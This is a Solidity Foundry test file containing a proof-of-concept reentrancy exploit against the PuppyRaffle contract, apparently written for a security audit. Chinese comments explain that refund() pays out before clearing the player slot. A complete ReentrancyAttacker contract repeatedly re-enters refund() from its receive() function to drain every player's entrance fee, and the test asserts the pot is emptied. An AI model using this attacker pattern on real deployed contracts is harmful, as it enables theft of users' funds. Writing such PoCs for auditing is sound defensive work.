// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/// @notice PoC: refund() 违反 checks-effects-interactions —— 先转账后清零 players[index]，
///         可被重入耗尽合约里所有玩家的入场费。
contract ReentrancyPoCTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function test_reentrancy_drainsRaffle() public {
        // 4 个诚实玩家入场，合约托管 4 ETH
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 raffleBefore = address(puppyRaffle).balance; // 4 ETH
        assertEq(raffleBefore, 4 * entranceFee);

        // 攻击者只花 1 ETH 入场
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), entranceFee); // 攻击者本金仅 1 ETH

        attacker.attack();

        // 结果：合约被抽干，攻击者卷走所有人的钱
        assertEq(address(puppyRaffle).balance, 0, "raffle drained to zero");
        assertEq(
            address(attacker).balance,
            raffleBefore + entranceFee,
            "attacker stole the whole pot"
        );
        emit log_named_uint("attacker net profit (wei)", address(attacker).balance - entranceFee);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public attackerIndex;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = _raffle.entranceFee();
    }

    function attack() external payable {
        address[] memory p = new address[](1);
        p[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(p);
        attackerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(attackerIndex); // 触发第一次退款，receive 里重入
    }

    function _steal() internal {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _steal();
    }
}
